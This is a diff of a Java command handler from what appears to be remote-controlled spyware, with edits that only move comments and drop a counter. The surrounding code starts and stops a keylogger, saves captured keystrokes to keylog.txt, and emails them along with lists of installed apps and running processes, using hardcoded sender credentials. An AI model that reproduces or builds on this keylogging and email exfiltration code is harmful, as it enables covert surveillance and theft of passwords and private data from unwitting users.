@@ -36,7 +36,7 @@ public class sendResponse {
             return;
         }
         switch (Server.reqList.getLast()){
-            //start keylog
+            //list app
             case "0": {
                 ListApp la = new ListApp();
                 File appList;
@@ -49,6 +49,7 @@ public class sendResponse {
                 sm.send(appList);
                 break;
             }
+            //start keylog
             case "1": {
                 kl.start();
                 sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
@@ -59,7 +60,6 @@ public class sendResponse {
             //end keylog
             case "2": {
                 String text = kl.end();
-                counts[2]++;
                 sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 File file = new File("keylog.txt");
                 try {
@@ -82,7 +82,7 @@ public class sendResponse {
                 System.out.println(2);
                 break;
             }
-            //list app
+            //list process
             case "3": {
                 ListPrc la = new ListPrc();
                 File file;
